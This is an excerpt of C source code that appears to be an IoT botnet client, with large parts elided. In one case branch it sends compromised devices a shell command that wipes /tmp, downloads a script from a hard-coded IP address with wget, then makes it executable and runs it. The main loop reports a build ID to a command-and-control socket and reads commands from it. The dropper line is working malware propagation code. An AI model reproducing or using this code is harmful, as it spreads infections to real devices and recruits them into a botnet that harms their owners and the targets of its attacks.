			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp; rm -rf *; wget -q http://208.67.1.176/cocks.sh; chmod +x cocks.sh; sh cocks.sh; rm -f *\r\n", 98, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
...
int main(int argc, unsigned char *argv[])
{
	...
	while(1)
	{
		...
		sockprintf(mainCommSock, "BUILD %s", getBuild());
				...
				int got = 0;
				int i = 0;
				while((got = recvLine(mainCommSock, commBuf, 1024)) != -1)
				{
                ...
                printf("Server side closed by host.\n");
        }
        return 0;
}